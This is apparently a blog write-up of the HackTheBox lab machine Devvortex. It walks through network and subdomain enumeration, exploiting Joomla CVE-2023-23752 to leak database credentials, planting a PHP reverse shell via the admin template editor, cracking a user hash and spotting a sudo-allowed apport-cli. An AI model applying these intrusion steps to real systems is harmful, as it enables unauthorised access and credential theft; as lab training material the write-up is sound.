---
title: Devvortex - HackTheBox
authors: Samarth
date: 2024-01-06 08:00:00 +0530
categories: [HackTheBox Machines]
tags: [Linux, Session Hijacking, Blind Command Injection]
math: true
mermaid: true
---

![Devvortex - HTB](/assets/images/writeups/Devvortex-HTB/banner.png)

## TL;DR


## Scanning Network

I began with an Nmap scan and identified open ports 22 and 80 for SSH and nginx, respectively. By extracting banners using Nmap, we determined that the `nginx` version is `1.18.0`. Let's review the Nmap results.

```bash
Command - nmap -sC -sV -A 10.10.11.242 

Nmap scan report for 10.10.11.242
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|_  256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have discovered two services: SSH and HTTP. Let's begin by enumerating the HTTP service. Allow us to delve into the enumeration phase.

## Enumeration

In the nmap scan, it ws observed that IP address gives us a reference to a domain name `devvortex.htb`. So, we have to add this domain to `"/etc/hosts"` file.

Let's open [http://devvortex.htb](http://devvortex.htb).

![Welcome to Devvortex!](/assets/images/writeups/Devvortex-HTB/1.png)

Devvortex is a dynamic web development agency that thrives on transforming ideas into digital realities. Let's initiate directory fuzzing to discover any potentially interesting directories or parameters.

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
===============================================================
Finished
==============================================================
```

While conducting directory fuzzing, we didn't discover anything noteworthy. As part of our web application enumeration strategy, we can explore subdomain enumeration through subdomain fuzzing.

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devvortex.htb

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

We have identified dev.devvortex.htb as a subdomain. Let's include this subdomain in the `"/etc/hosts"` file and proceed with its enumeration.

![Development version!](/assets/images/writeups/Devvortex-HTB/2.png)

The website displays slightly altered visuals, suggesting this version is under development, with the virtual host (vhost) inadvertently left enabled on the production environment.

Let's perform directory fuzzing again on the found subdomain and see if anything interesting comes up!

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/home                 (Status: 200) [Size: 23221]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/README.txt           (Status: 200) [Size: 4942]
/robots.txt           (Status: 200) [Size: 764]
===============================================================
Finished
===============================================================
```

We have found a couple of interesting directories, with `/administrator` being the first one worth exploring.

![Joomla Administrator Login](/assets/images/writeups/Devvortex-HTB/3.png)

We've identified the `Joomla Administrator` Login page at the endpoint /administrator. Despite attempting common credentials like `admin:password` and `admin:admin`, none of the login attempts were successful.

Following the unsuccessful attempts, let's explore `/robots.txt` to see if we can find anything interesting.

![Robots.txt](/assets/images/writeups/Devvortex-HTB/4.png)

We haven't found anything interesting except for the directories identified during directory enumeration. Let's check the `/README.txt` file next.

![Joomla version disclosure in README.txt](/assets/images/writeups/Devvortex-HTB/5.png)

We've identified the Joomla version as `4.2` in `/README.txt`. I found a tool in Kali Linux called `Joomscan` that can help us pinpoint the exact version within `4.2`. Let's use it.

```bash
   ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb/ ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found                                                                                                                                     
path : http://dev.devvortex.htb/robots.txt

Interesting path found from robots.txt                                                                                                                       
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/
```
Now that we have identified the exact `Joomla` version as `4.2.6`, let's begin searching for available exploits for this version.

## Exploitation

We have found one exploit available for `Joomla 4.2.6` that is `Joomla! information disclosure - CVE-2023-23752`. 

An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.

Let's use the exploit provided by `Acceis` for CVE-2023-23752(https://github.com/Acceis/exploit-CVE-2023-23752).

Let's understand how the above exploit works!

The vulnerability mentioned above indicates that `Joomla 4.2.6 - Unauthenticated Information Disclosure` discloses information about applications by bypassing the authorization check using the `public=True` endpoint. The URL that exposes this information is `{root_url}/api/index.php/v1/config/application?public=`.

Let's manually check the endpoint and gather the information and later on, we will run the script!

![Unauthenticated Information Disclosure](/assets/images/writeups/Devvortex-HTB/6.png)

Let's run the exploit and see what more information we can get from it.

```
ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

We already found the `username` as `lewis` and `password` as `P4ntherg0t1n5r3c0n##` getting disclosed by the endpoint. Along with that, we also found database information with db user and db password.

Let's use the above found credentials on the Joomla Administrator login and see if we can able to logged in successfully or not!

![Access to Joomla Dashboard](/assets/images/writeups/Devvortex-HTB/7.png)

While browsing the Dashboard, I found `index.php` on path `System -> Templates -> Administator Template -> index.php`. We can use one liner php reverse shell to get the shell from victim machine.

![One liner PHP reverse shell](/assets/images/writeups/Devvortex-HTB/8.png)

Let's start netcat listener and save the reverse shell. 

![Web shell](/assets/images/writeups/Devvortex-HTB/9.png)

We successfully got the reverse shell but we got webshell instead of a specific user. 
But the webshell we got was broken, so we performed below steps to get working shell 

`script /dev/null -c /bin/bash
Ctrl+Z`
stty raw -echo; fg
Press Enter twice`

As we already found the database username and password via exploit, let's utilize it and see if we can able to find anything interesting.

![New user found](/assets/images/writeups/Devvortex-HTB/10.png)

We have found new user `logan` and it's hashed password. Let's use `john` and try to crack the password.

We have successfully cracked the password. Let's use the credential `logan:tequieromucho`.

Let's list the allowed commands for invoking the user using `sudo -l`.

![Apport CLI](/assets/images/writeups/Devvortex-HTB/11.png)

We have permission to run `apport-cli`. Let's run it and find version.

![Apport CLI](/assets/images/writeups/Devvortex-HTB/12.png)

This version of apport-cli `2.20.11` seems to be vulnerable. Let's search exploit for it.


